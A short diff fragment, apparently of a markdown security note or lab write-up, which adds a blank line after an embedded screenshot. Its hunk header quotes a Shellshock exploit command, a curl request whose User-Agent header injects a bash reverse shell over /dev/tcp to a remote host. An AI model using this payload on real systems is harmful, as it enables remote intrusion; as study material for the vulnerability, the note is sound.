@@ -40,3 +40,4 @@ curl -A "() { :; }; echo Content-type: text/html; echo; /bin/bash -i >& /dev/tcp
 ```
 
 ![[Pasted image 20240224212355.png]]
+
